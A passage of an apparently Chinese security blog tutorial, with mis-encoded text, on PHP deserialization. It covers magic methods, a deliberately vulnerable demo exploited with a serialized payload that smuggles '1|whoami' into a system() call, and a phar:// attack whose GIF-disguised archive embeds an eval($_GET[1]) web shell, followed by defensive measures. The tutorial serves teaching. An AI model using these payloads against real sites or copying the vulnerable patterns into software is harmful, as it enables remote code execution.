class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="variable">$person1</span>-&gt;sex=<span class="string">&#x27;male&#x27;</span>;</span><br><span class="line"><span class="comment">// è¾“å‡º used set!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h2><p>å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶è‡ªåŠ¨è§¦å‘ï¼ˆPHP 5.3ä»¥ä¸Šï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$sex</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex=<span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used invoke!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="variable">$person1</span>();</span><br><span class="line"><span class="comment">// è¾“å‡º used invoke!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h2><p>è°ƒç”¨ç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ä¼šè¢«æ‰§è¡Œ</p><p>ä¸€èˆ¬PHPä¸­çš„callæ–¹æ³•éƒ½æ˜¯ç”¨æ¥è¿›è¡Œå®¹é”™æˆ–è€…æ˜¯åŠ¨æ€è°ƒç”¨</p><p>callä¸€èˆ¬ä¼šå­˜åœ¨<code>call_user_func</code>å’Œ<code>call_user_func_array</code>ï¼Œphpä»£ç æ‰§è¡Œçš„ç»ˆç‚¹ç»å¸¸é€‰æ‹©è¿™é‡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span>,<span class="variable">$sex</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex=<span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sercret</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$naem</span>,<span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;used call!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> Person(<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;female&#x27;</span>);</span><br><span class="line"><span class="variable">$person1</span>-&gt;sercret();</span><br><span class="line"><span class="comment">// è¾“å‡º used call!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="ååºåˆ—åŒ–æ¼æ´å®ä¾‹"><a href="#ååºåˆ—åŒ–æ¼æ´å®ä¾‹" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´å®ä¾‹"></a>ååºåˆ—åŒ–æ¼æ´å®ä¾‹</h1><p><strong>åˆ©ç”¨æ¼æ´æ€è·¯ï¼š</strong></p><p>ï¼ˆ1ï¼‰ä¸€èˆ¬ååºåˆ—åŒ–æ¼æ´éƒ½æ˜¯é€šè¿‡ä»£ç å®¡è®¡è€Œå‘ç°ï¼Œä¸€èˆ¬çš„é»‘ç›’æµ‹è¯•æ˜¯å¾ˆéš¾å‘ç°çš„ã€‚</p><p>ï¼ˆ2ï¼‰å‡å¦‚æˆ‘ä»¬é€šè¿‡ä»£ç å®¡è®¡å‘ç°äº†æ¼æ´ï¼Œæˆ‘ä»¬è¦æµ‹è¯•è¿™ä¸ªæ¼æ´ï¼Œé‚£ä¹ˆæˆ‘å¯ä»¥æ ¹æ®ç«™ç‚¹åå°çš„é€»è¾‘è¿›è¡Œpayloadçš„ç”Ÿæˆã€‚</p><p>ï¼ˆ3ï¼‰æˆ‘ä»¬å°†ç”Ÿæˆçš„payloadï¼ˆä¸€ä¸²åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼‰é€šè¿‡å‰å°æ¥å£å‘é€è‡³åå°ï¼Œåå°åœ¨åˆ›å»ºã€é”€æ¯å¯¹è±¡çš„æ—¶å€™ä¼šæ‰§è¡Œé­”æ³•å‡½æ•°ï¼Œå®Œæˆé¢„æœŸæ”»å‡»ã€‚</p><p><strong>å®ä¾‹</strong></p><p>demo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args=<span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨__destruct()æ–¹æ³•</span></span><br><span class="line"><span class="comment">     * æ­¤æ–¹æ³•ä¸­ä¼šæ‰§è¡Œå›è°ƒå‡½æ•°ï¼Œå³pingæ–¹æ³•</span></span><br><span class="line"><span class="comment">     * å¯ä»¥åœ¨å®ä¾‹åŒ–å¯¹è±¡æ—¶å°†methodè®¾ä¸ºpingï¼Œå°è¯•å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// in_array() å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ï¼Œè¿™é‡Œmethodå¦‚æœæ˜¯pingï¼Œåˆ™è¿”å›true</span></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method,<span class="keyword">array</span>(<span class="string">&quot;ping&quot;</span>)))&#123;</span><br><span class="line">            <span class="comment">// è°ƒç”¨å›è°ƒå‡½æ•°ï¼Œå¹¶æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°</span></span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="keyword">$this</span>-&gt;method),<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * pingæ–¹æ³•ä½¿ç”¨äº†systemæ‰§è¡Œç³»ç»Ÿå‘½ä»¤,ä¸ºå¯åˆ©ç”¨ç‚¹</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$host</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> system(<span class="string">&quot;ping -c 2 <span class="subst">$host</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span>=str_replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;waf(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">@unserialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆpayload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args=<span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> home(<span class="string">&#x27;ping&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;1|whoami&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="comment">// O:4:&quot;home&quot;:2:&#123;s:12:&quot;homemethod&quot;;s:4:&quot;ping&quot;;s:10:&quot;homeargs&quot;;a:1:&#123;i:0;s:8:&quot;1|whoami&quot;;&#125;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><p><code>a=O:4:&quot;home&quot;:2:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:8:&quot;1|whoami&quot;;&#125;&#125;</code></p><blockquote><p>ç±»ä¸­å±æ€§ä¸ºprivateæ—¶ï¼Œè¡¨ç¤ºæ–¹å¼æ˜¯åœ¨å±æ€§åå‰åŠ ä¸Š %00ç±»å%00</p><p>ç±»ä¸­å±æ€§ä¸ºprotectedæ—¶ï¼Œè¡¨ç¤ºæ–¹å¼æ˜¯åœ¨å±æ€§åå‰åŠ ä¸Š %00*%00</p></blockquote><p>æäº¤payloadï¼ŒæˆåŠŸåˆ©ç”¨ï¼</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210616002639723.png" alt="image-20210616002639723"></p><h1 id="åˆ©ç”¨phar-çš„ååºåˆ—åŒ–"><a href="#åˆ©ç”¨phar-çš„ååºåˆ—åŒ–" class="headerlink" title="åˆ©ç”¨phar://çš„ååºåˆ—åŒ–"></a>åˆ©ç”¨phar://çš„ååºåˆ—åŒ–</h1><blockquote><p>ç®€å•æ¥è¯´<code>phar</code>å°±æ˜¯<code>php</code>å‹ç¼©æ–‡æ¡£ã€‚å®ƒå¯ä»¥æŠŠå¤šä¸ªæ–‡ä»¶å½’æ¡£åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè€Œä¸”ä¸ç»è¿‡è§£å‹å°±èƒ½è¢« php è®¿é—®å¹¶æ‰§è¡Œï¼Œä¸<code>file://</code> <code>php://</code>ç­‰ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€ç§æµåŒ…è£…å™¨ã€‚</p></blockquote><p>Black Hatä¸Šï¼Œå®‰å…¨ç ”ç©¶å‘˜<code>Sam Thomas</code>åˆ†äº«äº†è®®é¢˜<code>Itâ€™s a PHP unserialization vulnerability Jim, but not as we know it</code>ï¼Œåˆ©ç”¨pharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataè¿™ä¸€ç‰¹æ€§ï¼Œæ‹“å±•äº†phpååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»é¢ã€‚è¯¥æ–¹æ³•åœ¨<strong>æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</strong>ï¼ˆfile_exists()ã€is_dir()ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆ<strong>phar://ä¼ªåè®®</strong>ï¼Œå¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</p><p>æ‘˜è‡ªï¼š<a href="https://paper.seebug.org/680/">åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢</a></p><p><strong>pharæ–‡ä»¶ç»“æ„</strong></p><ul><li><code>stub</code> phar æ–‡ä»¶æ ‡è¯†ï¼Œæ ¼å¼ä¸º <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;ï¼›</code></li><li><code>manifest</code> å‹ç¼©æ–‡ä»¶çš„å±æ€§ç­‰ä¿¡æ¯ï¼Œä»¥<strong>åºåˆ—åŒ–</strong>å­˜å‚¨ï¼›</li><li><code>contents</code> å‹ç¼©æ–‡ä»¶çš„å†…å®¹ï¼›</li><li><code>signature</code> ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼›</li></ul><p><strong>åˆ›å»ºpharæ–‡ä»¶</strong></p><p>æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„<code>phar.readonly</code>é€‰é¡¹è®¾ç½®ä¸º<code>Off</code>ï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> TestObject();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåç”Ÿæˆä¸€ä¸ª<code>phar.phar</code>ï¼Œè‡ªå®šä¹‰çš„meta-dataä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210627215824342.png" alt="image-20210627215824342"></p><p>phpä¸€å¤§éƒ¨åˆ†çš„<a href="http://php.net/manual/en/ref.filesystem.php">æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</a>åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Destruct called&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">    file_get_contents(<span class="variable">$filename</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210627221851355.png" alt="image-20210627221851355"></p><p><strong>demo</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">heello</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;echo &quot;heello!&quot;;&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;output);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_exists(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè™½ç„¶æ²¡æœ‰<code>unserialize()</code>æ‰§è¡Œååºåˆ—åŒ–ï¼Œä½†å¯ä»¥ç»“åˆ<code>file_exists()</code>å‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œè¿›è€Œè§¦å‘<code>__destruct()</code>å‡½æ•°ï¼Œåˆ©ç”¨<code>eval()</code>å‡½æ•°è¾¾åˆ°å‘½ä»¤æ‰§è¡Œã€‚</p><p>psï¼šå¯å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ï¼ˆæ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åï¼‰ï¼Œç»•è¿‡æ–‡ä»¶ä¸Šä¼ æ£€æµ‹ï¼Œä¸Šä¼ â€œpharæ–‡ä»¶â€åˆ°æœåŠ¡å™¨è¿›è¡Œåˆ©ç”¨ã€‚</p><p>ä½¿ç”¨å¦‚ä¸‹ä»£ç ç”Ÿæˆpharæ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">heello</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;@eval($_GET[1]);&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> heello();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†<code>test.phar</code>æ”¹ä¸º<code>test.gif</code>å¹¶ä¸Šä¼ ï¼Œè®¿é—®<code>?filename=phar://test.gif/test.txt&amp;1=phpinfo();</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210627231830253.png" alt="image-20210627231830253"></p><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><ol><li><p>è®¤è¯å’Œç­¾å</p><p>é€šè¿‡è®¤è¯ï¼Œæ¥é¿å…åº”ç”¨æ¥å—é»‘å®¢çš„å¼‚å¸¸è¾“å…¥ã€‚å¯¹äºç‚¹å¯¹ç‚¹çš„æœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ å…¥ç­¾åçš„æ–¹å¼æ¥è¿›è¡Œé˜²æŠ¤ã€‚æ¯”å¦‚ï¼Œå¯¹å­˜å‚¨çš„æ•°æ®è¿›è¡Œç­¾åï¼Œä»¥æ­¤å¯¹è°ƒç”¨æ¥æºè¿›è¡Œèº«ä»½æ ¡éªŒã€‚åªè¦é»‘å®¢è·å–ä¸åˆ°å¯†é’¥ä¿¡æ¯ï¼Œå®ƒå°±æ— æ³•å‘è¿›è¡Œååºåˆ—åŒ–çš„æœåŠ¡æ¥å£å‘é€æ•°æ®ï¼Œä¹Ÿå°±æ— ä»å‘èµ·ååºåˆ—åŒ–æ”»å‡»äº†ã€‚</p></li><li><p>é™åˆ¶åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç±»</p><p>å¯ä»¥é€šè¿‡æ„å»ºé»‘åå•çš„æ–¹å¼ï¼Œæ¥æ£€æµ‹ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨é“¾çš„å¼‚å¸¸ã€‚</p></li><li><p>RASPæ£€æµ‹</p><p>ä¸šå†…æ¨å‡ºäº† RASPï¼ˆRuntime Application Self-Protectionï¼Œå®æ—¶ç¨‹åºè‡ªæˆ‘ä¿æŠ¤ï¼‰ã€‚RASP é€šè¿‡ hook ç­‰æ–¹å¼ï¼Œåœ¨è¿™äº›å…³é”®å‡½æ•°çš„è°ƒç”¨ä¸­ï¼Œå¢åŠ ä¸€é“è§„åˆ™çš„æ£€æµ‹ã€‚è¿™ä¸ªè§„åˆ™ä¼šåˆ¤æ–­åº”ç”¨æ˜¯å¦æ‰§è¡Œäº†éåº”ç”¨æœ¬èº«çš„é€»è¾‘ï¼Œèƒ½å¤Ÿåœ¨ä¸ä¿®æ”¹ä»£ç 